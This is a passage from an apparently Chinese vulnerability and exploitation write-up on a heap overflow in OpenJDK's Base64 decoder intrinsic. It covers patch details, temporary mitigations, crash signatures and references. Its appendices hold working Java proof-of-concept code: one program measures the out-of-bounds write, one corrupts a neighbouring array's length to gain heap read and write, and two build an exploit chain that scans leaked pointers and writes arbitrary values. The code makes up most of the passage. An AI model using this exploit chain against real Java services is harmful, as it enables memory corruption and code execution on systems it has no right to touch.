/proc/self/maps，远程得靠堆内读原语从相邻对象泄漏指针</p></li><li><p><strong>逐目标的分配尺寸与 GC 行为画像</strong>——不同应用的堆使用模式不同</p></li></ol><p>这三步在 Jira、Jenkins、Keycloak 这类打包应用上比自研应用更容易，因为版本和内存布局在不同目标间高度重复。</p><h2 id=\"sec-35\">九、修复措施</h2><h3 id=\"sec-36\">1、安全更新</h3><pre><code># 从 Adoptium 下载修复版（21.0.13.1 及后续版本会自动取到最新）\ncurl -sL -o jdk21-fixed.tar.gz \\\n  \"https://api.adoptium.net/v3/binary/latest/21/ga/linux/x64/jdk/hotspot/normal/eclipse\"</code></pre><p>修复 diff（21u 分支，编译为 3 行代码）：</p><pre><code>+ // A padded Base64 tail shorter than one complete block is handled by Java.\n+ __ cmpl(length, 4);\n+ __ jcc(Assembler::less, L_bruteForce);</code></pre><h3 id=\"sec-37\">2、临时缓解</h3><ol><li><p><code>-XX:-UseBASE64Intrinsics</code>——实测让同一输入停在数组内</p></li><li><p><code>-XX:UseAVX=2</code>——同样有效，但影响整个进程的 AVX-512，不只 Base64</p></li><li><p>应用层把 Base64 输入限制成 4 的倍数、填充只在末尾</p></li><li><p>检测特征：</p></li></ol><ul><li><p>JVM 收到畸形 Base64 后 SIGSEGV，hs_err 里 <code>Problematic frame</code> 指向 <code>Base64$Decoder.decodeBlock</code> 或 <code>decode0</code></p></li><li><p>核查 JVM 启动参数是否含 <code>-XX:-UseBASE64Intrinsics</code></p></li><li><p>容器基础镜像里 JDK 版本的批量盘点</p></li></ul><ol><li><p>WAF 的局限：漏洞在 OpenJDK 自身，很多用户输入路径都能进到易受攻击代码，WAF 规则不太可能覆盖所有路径，也覆盖不了自研应用</p></li><li><p>下游发行版同步排查：Eclipse Temurin、Amazon Corretto、Azul Zulu、BellSoft Liberica、Microsoft OpenJDK、Red Hat build、SapMachine、Alpine、Debian openjdk、Ubuntu openjdk、Homebrew——各家发布修复版本的时间可能滞后于 OpenJDK 上游，用 <code>java -version</code> 确认而非假设已更新</p></li></ol><h2 id=\"sec-38\">参考</h2><ul><li><p>OpenJDK 2026-11-17 通告：<a href=\"https://openjdk.org/groups/vulnerability/advisories/2026-11-17\">https://openjdk.org/groups/vulnerability/advisories/2026-11-17</a></p></li><li><p>Oracle CPU：<a href=\"https://www.oracle.com/security-alerts/cspunov2026.html\">https://www.oracle.com/security-alerts/cspunov2026.html</a></p></li><li><p>21u 修复 commit：<a href=\"https://github.com/openjdk/jdk21u/commit/8e115fb5c7c5e2b35f0aa86353ce3f84b49e7319\">https://github.com/openjdk/jdk21u/commit/8e115fb5c7c5e2b35f0aa86353ce3f84b49e7319</a></p></li><li><p>21.0.13 的 Base64.Decoder：<a href=\"https://github.com/openjdk/jdk21u/blob/jdk-21.0.13-ga/src/java.base/share/classes/java/util/Base64.java\">https://github.com/openjdk/jdk21u/blob/jdk-21.0.13-ga/src/java.base/share/classes/java/util/Base64.java</a></p></li><li><p>21.0.13 的桩：<a href=\"https://github.com/openjdk/jdk21u/blob/jdk-21.0.13-ga/src/hotspot/cpu/x86/stubGenerator_x86_64.cpp\">https://github.com/openjdk/jdk21u/blob/jdk-21.0.13-ga/src/hotspot/cpu/x86/stubGenerator_x86_64.cpp</a></p></li><li><p>VulnCheck 崩溃与代码执行门槛分析：<a href=\"https://www.vulncheck.com/blog/java4shell\">https://www.vulncheck.com/blog/java4shell</a></p></li><li><p>Wiz 通报（远程利用可行性）：<a href=\"https://www.wiz.io/blog/cve-2026-114938\">https://www.wiz.io/blog/cve-2026-114938</a></p></li></ul><hr><h2 id=\"sec-39\">附：相关代码</h2><h3 id=\"sec-40\">附录 A：Measure.java（基线测量）</h3><pre><code>import java.util.Arrays;\nimport java.util.Base64;\n\n/** 预热让 C2 换桩，畸形串解进预填 0xEE 的大数组，数实际写到的字节。 */\npublic class Measure {\n    public static void main(String[] args) throws Exception {\n        byte[] warm = \"Zz9+Zz9+\".getBytes();\n        for (int i = 0; i &lt; 200_000; i++) Base64.getDecoder().decode(warm);\n\n        for (int n : new int[]{128, 64}) {\n            byte[] src = ((\"A\".repeat(n)) + \"=\").getBytes();\n            int exact = 3 * ((src.length + 3) / 4) - 1;\n            byte[] dst = new byte[226];\n            Arrays.fill(dst, (byte) 0xEE);\n            String r;\n            try { Base64.getDecoder().decode(src, dst); r = \"ok\"; }\n            catch (IllegalArgumentException e) { r = \"IAE\"; }\n            int written = 0;\n            for (int i = dst.length - 1; i &gt;= 0; i--)\n                if (dst[i] != (byte) 0xEE) { written = i + 1; break; }\n            StringBuilder sb = new StringBuilder();\n            for (int i = exact - 4; i &lt; exact; i++) sb.append(String.format(\"%02x\", dst[i]));\n            sb.append('|');\n            for (int i = exact; i &lt; Math.min(exact + 16, dst.length); i++)\n                sb.append(String.format(\"%02x\", dst[i]));\n            System.out.println(\"case=\" + n + \"A+eq\");\n            System.out.println(\"src.length=\" + src.length);\n            System.out.println(\"exact=\" + exact);\n            System.out.println(\"decode=\" + r);\n            System.out.println(\"bytes_written=\" + written);\n            System.out.println(\"past_end=\" + (written - exact));\n            System.out.println(\"around_end=\" + sb);\n            System.out.println();\n        }\n    }\n}</code></pre><h3 id=\"sec-41\">附录 B：One.java（独立 JVM 基线）</h3><pre><code>import java.util.Arrays;\nimport java.util.Base64;\n\npublic class One {\n    public static void main(String[] args) {\n        byte[] warm = \"Zz9+Zz9+\".getBytes();\n        for (int i = 0; i &lt; 200_000; i++) Base64.getDecoder().decode(warm);\n        int n = Integer.parseInt(args[0]);\n        byte[] src = ((\"A\".repeat(n)) + \"=\").getBytes();\n        int exact = 3 * ((src.length + 3) / 4) - 1;\n        byte[] dst = new byte[226];\n        Arrays.fill(dst, (byte) 0xEE);\n        try { Base64.getDecoder().decode(src, dst); } catch (IllegalArgumentException e) {}\n        int written = 0;\n        for (int i = dst.length - 1; i &gt;= 0; i--)\n            if (dst[i] != (byte) 0xEE) { written = i + 1; break; }\n        System.out.println(\"case=\" + n + \"A+eq exact=\" + exact + \" bytes_written=\" + written\n            + \" past_end=\" + (written - exact));\n    }\n}</code></pre><h3 id=\"sec-42\">附录 C：Corrupt2.java（正数 length + 堆内相对读写）</h3><pre><code>import java.util.Arrays;\nimport java.util.Base64;\n\n/** dst=byte[72] → 邻居 length 砸成 0x699aa669（正），再借它相对读/写。 */\npublic class Corrupt2 {\n    public static void main(String[] args) {\n        byte[] warmSrc = \"Zz9+Zz9+\".getBytes();\n        byte[] src = (\"A\".repeat(64) + \"=\").getBytes();\n        byte[] marker0 = \"TARGETMARKER__PWNED__TARGETMARKER__PWNED\".getBytes();\n\n        for (int round = 0; round &lt; 20; round++) {\n            byte[] warmDst = new byte[72];\n            for (int i = 0; i &lt; 60_000; i++) Base64.getDecoder().decode(warmSrc, warmDst);\n\n            byte[] dst = new byte[72];\n            byte[] victim = new byte[16];\n            byte[] marker = marker0.clone();\n            try { Base64.getDecoder().decode(src, dst); }\n            catch (IllegalArgumentException e) {}\n\n            if (victim.length &gt; 1000) {\n                System.out.println(\"round \" + round + \": victim.length = \" + victim.length\n                    + \" (0x\" + Integer.toHexString(victim.length) + \")\");\n                int found = -1;\n                byte[] pat = \"TARGETMARKER\".getBytes();\n                for (int i = 0; i &lt; victim.length - pat.length; i++) {\n                    boolean ok = true;\n                    for (int j = 0; j &lt; pat.length; j++)\n                        if (victim[i + j] != pat[j]) { ok = false; break; }\n                    if (ok) { found = i; break; }\n                }\n                System.out.println(\"marker found via victim at offset = \" + found);\n                if (found &gt;= 0) {\n                    byte[] w = \"OWNED__\".getBytes();\n                    for (int j = 0; j &lt; w.length; j++) victim[found + 13 + j] = w[j];\n                    System.out.println(\"marker now = \" + new String(marker, 0, 24));\n                }\n                return;\n            }\n        }\n        System.out.println(\"failed after 20 rounds\");\n    }\n}</code></pre><h3 id=\"sec-43\">附录 D：Chain28.java（预热写方法反例——不预热，崩溃）</h3><pre><code>import java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.nio.ByteBuffer;\nimport java.util.Base64;\n\n/** 与 Chain29 唯一区别：不预热写方法，直接内联写 victim → 解释器 klass 解引用 → SIGSEGV */\npublic class Chain28 {\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fos = new FileOutputStream(\"/tmp/b64_stage.bin\");\n        FileInputStream mapsIn = new FileInputStream(\"/proc/self/maps\");\n        byte[] maps = new byte[32768];\n        byte[] warmSrc = \"Zz9+Zz9+\".getBytes();\n        byte[] src = (\"A\".repeat(64) + \"=\").getBytes();\n        long[] magic = {0x4142434445460000L, 0x4142434445460001L, 0x4142434445460002L, 0x4142434445460003L};\n\n        int roundHit = -1;\n        byte[] victim = null;\n        ByteBuffer[] dbbs = null;\n        int addrOff = -1, elemOff = -1;\n        long a0 = 0, a1 = 0;\n\n        outer:\n        for (int round = 0; round &lt; 40; round++) {\n            byte[] warmDst = new byte[72];\n            for (int i = 0; i &lt; 60_000; i++) Base64.getDecoder().decode(warmSrc, warmDst);\n            byte[] dst = new byte[72];\n            victim = new byte[16];\n            dbbs = new ByteBuffer[4];\n            for (int i = 0; i &lt; 4; i++) { dbbs[i] = ByteBuffer.allocateDirect(65536); dbbs[i].putLong(0, magic[i]); }\n            byte[] tail = \"TAILMARKERTAILMARKER\".getBytes();\n            try { Base64.getDecoder().decode(src, dst); } catch (IllegalArgumentException e) {}\n            if (victim.length &lt;= 1000) continue;\n            fos.write(1);\n            for (int o = 16; o &lt; 1200 &amp;&amp; addrOff &lt; 0; o += 4) {\n                long v = rd64(victim, o);\n                if (!sane(v)) continue;\n                if (rd64(victim, o + 64) != v) continue;\n                long v2 = rd64(victim, o + 136);\n                if (!sane(v2) || v2 &lt;= v) continue;\n                if (rd64(victim, o + 136 + 64) != v2) continue;\n                addrOff = o; a0 = v; a1 = v2;\n            }\n            if (addrOff &lt; 0) continue;\n            for (int o = 16; o &lt; 3000; o += 4) {\n                int e0 = r32(victim, o);\n                if (e0 != 0 &amp;&amp; r32(victim, o+4) - e0 == 136 &amp;&amp; r32(victim, o+8) - r32(victim, o+4) == 136\n                    &amp;&amp; r32(victim, o+12) - r32(victim, o+8) == 136) { elemOff = o; break; }\n            }\n            if (elemOff &lt; 0) { addrOff = -1; continue; }\n            roundHit = round; break outer;\n        }\n        if (roundHit &lt; 0) { fos.write(0x4E); fos.flush(); fos.close(); return; }\n        fos.write(2);\n        // identity 写自检（全内联，不经预热的独立方法）\n        long v64 = 0; for (int j = 7; j &gt;= 0; j--) v64 = (v64 &lt;&lt; 8) | (victim[64 + j] &amp; 0xFF);\n        fos.write(0xA0);\n        victim[64]=(byte)v64; victim[65]=(byte)(v64&gt;&gt;&gt;8); victim[66]=(byte)(v64&gt;&gt;&gt;16); victim[67]=(byte)(v64&gt;&gt;&gt;24);\n        victim[68]=(byte)(v64&gt;&gt;&gt;32); victim[69]=(byte)(v64&gt;&gt;&gt;40); victim[70]=(byte)(v64&gt;&gt;&gt;48); victim[71]=(byte)(v64&gt;&gt;&gt;56);\n        fos.write(0xA1);\n        long v128 = 0; for (int j = 7; j &gt;= 0; j--) v128 = (v128 &lt;&lt; 8) | (victim[128 + j] &amp; 0xFF);\n        fos.write(0xB0);\n        victim[128]=(byte)v128; victim[129]=(byte)(v128&gt;&gt;&gt;8); victim[130]=(byte)(v128&gt;&gt;&gt;16); victim[131]=(byte)(v128&gt;&gt;&gt;24);\n        victim[132]=(byte)(v128&gt;&gt;&gt;32); victim[133]=(byte)(v128&gt;&gt;&gt;40); victim[134]=(byte)(v128&gt;&gt;&gt;48); victim[135]=(byte)(v128&gt;&gt;&gt;56);\n        fos.write(0xB1);\n        long v1024 = 0; for (int j = 7; j &gt;= 0; j--) v1024 = (v1024 &lt;&lt; 8) | (victim[1024 + j] &amp; 0xFF);\n        fos.write(0xC0);\n        victim[1024]=(byte)v1024; victim[1025]=(byte)(v1024&gt;&gt;&gt;8); victim[1026]=(byte)(v1024&gt;&gt;&gt;16); victim[1027]=(byte)(v1024&gt;&gt;&gt;24);\n        victim[1028]=(byte)(v1024&gt;&gt;&gt;32); victim[1029]=(byte)(v1024&gt;&gt;&gt;40); victim[1030]=(byte)(v1024&gt;&gt;&gt;48); victim[1031]=(byte)(v1024&gt;&gt;&gt;56);\n        fos.write(0xC1);\n        victim[1088]=1; victim[1089]=0; victim[1090]=0; victim[1091]=0;\n        victim[1092]=0; victim[1093]=0; victim[1094]=0; victim[1095]=0;\n        fos.write(0xD0);\n        fos.flush(); fos.close();\n    }\n    static long rd64(byte[] v, int o) { long r = 0; for (int j = 7; j &gt;= 0; j--) r = (r &lt;&lt; 8) | (v[o + j] &amp; 0xFF); return r; }\n    static boolean sane(long v) { return (v &gt;&gt;&gt; 47) == 0 &amp;&amp; (v &gt;&gt;&gt; 32) &gt;= 0x100 &amp;&amp; (v &amp; 0xF) == 0; }\n    static int r32(byte[] v, int o) { return (v[o]&amp;0xFF) | ((v[o+1]&amp;0xFF)&lt;&lt;8) | ((v[o+2]&amp;0xFF)&lt;&lt;16) | ((v[o+3]&amp;0xFF)&lt;&lt;24); }\n}</code></pre><h3 id=\"sec-44\">附录 E：Chain29.java（预热写方法正例——预热后写入成功）</h3><pre><code>import java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.nio.ByteBuffer;\nimport java.util.Base64;\n\n/** 与 Chain28 唯一区别：main 开头预热 w8（20 万次），之后写 victim 走 C1 编译产物 */\npublic class Chain29 {\n    static byte[] hotDummy = new byte[4096];\n    static void w8(byte[] a, int o, long x) {\n        a[o]=(byte)x; a[o+1]=(byte)(x&gt;&gt;&gt;8); a[o+2]=(byte)(x&gt;&gt;&gt;16); a[o+3]=(byte)(x&gt;&gt;&gt;24);\n        a[o+4]=(byte)(x&gt;&gt;&gt;32); a[o+5]=(byte)(x&gt;&gt;&gt;40); a[o+6]=(byte)(x&gt;&gt;&gt;48); a[o+7]=(byte)(x&gt;&gt;&gt;56);\n    }\n\n    public static void main(String[] args) throws Exception {\n        FileOutputStream fos = new FileOutputStream(\"/tmp/b64_stage.bin\");\n        // 预热预热写方法（这是与 Chain28 的唯一区别）\n        for (int i = 0; i &lt; 200_000; i++) w8(hotDummy, 64, i);\n        byte[] warmSrc = \"Zz9+Zz9+\".getBytes();\n        byte[] src = (\"A\".repeat(64) + \"=\").getBytes();\n        long[] magic = {0x4142434445460000L, 0x4142434445460001L, 0x4142434445460002L, 0x4142434445460003L};\n\n        int roundHit = -1;\n        byte[] victim = null;\n        ByteBuffer[] dbbs = null;\n        int addrOff = -1, elemOff = -1;\n        long a0 = 0, a1 = 0;\n\n        outer:\n        for (int round = 0; round &lt; 40; round++) {\n            byte[] warmDst = new byte[72];\n            for (int i = 0; i &lt; 60_000; i++) Base64.getDecoder().decode(warmSrc, warmDst);\n            byte[] dst = new byte[72];\n            victim = new byte[16];\n            dbbs = new ByteBuffer[4];\n            for (int i = 0; i &lt; 4; i++) { dbbs[i] = ByteBuffer.allocateDirect(65536); dbbs[i].putLong(0, magic[i]); }\n            byte[] tail = \"TAILMARKERTAILMARKER\".getBytes();\n            try { Base64.getDecoder().decode(src, dst); } catch (IllegalArgumentException e) {}\n            if (victim.length &lt;= 1000) continue;\n            fos.write(1);\n            for (int o = 16; o &lt; 1200 &amp;&amp; addrOff &lt; 0; o += 4) {\n                long v = rd64(victim, o);\n                if (!sane(v)) continue;\n                if (rd64(victim, o + 64) != v) continue;\n                long v2 = rd64(victim, o + 136);\n                if (!sane(v2) || v2 &lt;= v) continue;\n                if (rd64(victim, o + 136 + 64) != v2) continue;\n                addrOff = o; a0 = v; a1 = v2;\n            }\n            if (addrOff &lt; 0) continue;\n            for (int o = 16; o &lt; 3000; o += 4) {\n                int e0 = r32(victim, o);\n                if (e0 != 0 &amp;&amp; r32(victim, o+4) - e0 == 136 &amp;&amp; r32(victim, o+8) - r32(victim, o+4) == 136\n                    &amp;&amp; r32(victim, o+12) - r32(victim, o+8) == 136) { elemOff = o; break; }\n            }\n            if (elemOff &lt; 0) { addrOff = -1; continue; }\n            roundHit = round; break outer;\n        }\n        if (roundHit &lt; 0) { fos.write(0x4E); fos.flush(); fos.close(); return; }\n        fos.write(2);\n        // 经预热的 C1 编译方法写\n        long v64 = 0; for (int j = 7; j &gt;= 0; j--) v64 = (v64 &lt;&lt; 8) | (victim[64 + j] &amp; 0xFF);\n        w8(victim, 64, v64);            // identity 写 @64 —— Chain28 在这里崩\n        fos.write(0xA1);\n        w8(victim, 1024, 0x2131415161718191L);\n        fos.write(0xA2);\n        long rb = 0; for (int j = 7; j &gt;= 0; j--) rb = (rb &lt;&lt; 8) | (victim[1024 + j] &amp; 0xFF);\n        dump8(fos, rb);\n        fos.flush(); fos.close();\n    }\n    static long rd64(byte[] v, int o) { long r = 0; for (int j = 7; j &gt;= 0; j--) r = (r &lt;&lt; 8) | (v[o + j] &amp; 0xFF); return r; }\n    static boolean sane(long v) { return (v &gt;&gt;&gt; 47) == 0 &amp;&amp; (v &gt;&gt;&gt; 32) &gt;= 0x100 &amp;&amp; (v &amp; 0xF) == 0; }\n    static int r32(byte[] v, int o) { return (v[o]&amp;0xFF) | ((v[o+1]&amp;0xFF)&lt;&lt;8) | ((v[o+2]&amp;0xFF)&lt;&lt;16) | ((v[o+3]&amp;0xFF)&lt;&lt;24); }\n    static void dump8(FileOutputStream f, long v) throws Exception {\n        byte[] b = new byte[8];\n        for (int i = 0; i &lt; 8; i++) { b[i] = (byte) v; v &gt;&gt;&gt;= 8; }\n        f.write(b);\n    }\n}</code></pre>","original","zhKind","complete","复现","漏洞利用","漏洞分析","利用链","Oracle","AWS","Red Hat","Ubuntu","Debian","Microsoft","https://xz.aliyun.com/news/93395","先知社区",{"_236":237,"_238":-5},"changelogVersion","2026-10-01T08:00","release"]
